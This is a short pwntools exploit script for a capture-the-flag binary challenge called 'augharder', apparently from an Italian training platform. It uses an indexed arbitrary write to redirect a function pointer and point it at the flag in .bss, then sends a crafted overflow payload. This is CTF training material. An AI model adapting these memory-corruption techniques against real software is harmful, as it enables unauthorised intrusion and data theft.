#!/usr/bin/env python3

from pwn import *

elf = ELF("./augharder_patched")

context.binary = elf

context.terminal = ()

context.arch = 'i386'

if args.REMOTE:
    p = remote('augharder.challs.olicyber.it', 10607)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b *main+203
        c
    ''')
else:
    p = elf.process()

def write_to_idx(idx,what):
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b': ',str(idx).encode())
    p.sendlineafter(b': ',str(what).encode())    


def main():

    write_to_idx(1,elf.sym['beta_write'])
    write_to_idx(3,0x804B060) # flag nella bss
    write_to_idx(4,40)
 
    p.sendlineafter(b'> ',b'5')

    payload = b'pp' + b'a'*28 + p64(0x804B0A0+4)
    p.sendlineafter(b': ',payload)

    p.interactive()

if __name__ == "__main__":
    main()